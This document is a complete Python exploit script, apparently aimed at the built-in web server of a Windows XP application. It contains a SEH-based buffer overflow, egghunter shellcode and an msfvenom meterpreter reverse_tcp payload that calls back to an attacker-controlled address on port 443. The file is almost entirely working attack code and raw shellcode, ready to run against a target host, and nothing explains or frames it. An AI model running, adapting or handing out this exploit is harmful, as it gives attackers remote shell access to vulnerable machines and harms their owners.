# Tested on Windows XP SP3 (x86)
# The application requires to have the web server enabled. 

#!/usr/bin/python
import socket, threading, struct

host = "192.168.228.155"
port = 80

def send_egghunter_request(): 

    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.228.158 LPORT=443 -f py 
    buf  = "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
    buf += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
    buf += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
    buf += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
    buf += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
    buf += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
    buf += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
    buf += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
    buf += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
    buf += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
    buf += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
    buf += "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
    buf += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
    buf += "\xff\xd5\x6a\x0a\x68\xc0\xa8\xe4\x9e\x68\x02\x00\x01"
    buf += "\xbb\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
    buf += "\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"
    buf += "\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec"
    buf += "\xe8\x61\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02"
    buf += "\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a"
    buf += "\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
    buf += "\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
    buf += "\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x22\x58\x68\x00\x40"
    buf += "\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57"
    buf += "\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\xe9"
    buf += "\x71\xff\xff\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xf0"
    buf += "\xb5\xa2\x56\x6a\x00\x53\xff\xd5"

    egghunter  = "W00T" * 2
    egghunter += "\x90" * 16 # Padding
    egghunter += buf
    egghunter += "\x42" * (100000 - len(egghunter))
    content_length = len(egghunter) + 1000 # Just 1000 padding. 
    
    egghunter_request =  "POST / HTTP/1.1\r\n"
    egghunter_request += "Content-Type: multipart/form-data; boundary=evilBoundary\r\n"
    egghunter_request += "Content-Length: " + str(content_length) +  "\r\n"
    egghunter_request += "\r\n"
    egghunter_request += egghunter

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(egghunter_request)
    s.recv(1024)
    s.close()

def send_exploit_request():

    buffer  = "\x90" * 2495
    buffer += "\xeb\x06\x90\x90"            # short jump
    buffer += struct.pack("<L", 0x1014fdef) # POP ESI; POP EBX; RETN - libspp

    # ./egghunter.rb -b "\x00\x0a\x0b" -e "W00T" -f py
    buffer += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
    buffer += "\x05\x5a\x74\xef\xb8\x57\x30\x30\x54\x89\xd7\xaf\x75"
    buffer += "\xea\xaf\x75\xe7\xff\xe7"
    buffer += "\x41" * (6000 - len(buffer))

    #HTTP Request
    request = "GET /" + buffer + "HTTP/1.1" + "\r\n"
    request += "Host: " + host + "\r\n"
    request += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0" + "\r\n"
    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + "\r\n"
    request += "Accept-Language: en-US,en;q=0.5" + "\r\n"
    request += "Accept-Encoding: gzip, deflate" + "\r\n"
    request += "Connection: keep-alive" + "\r\n\r\n"
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(request)
    s.close()

if __name__ == "__main__": 

    t = threading.Thread(target=send_egghunter_request)
    t.start()
    print "[+] Thread started."
    send_exploit_request()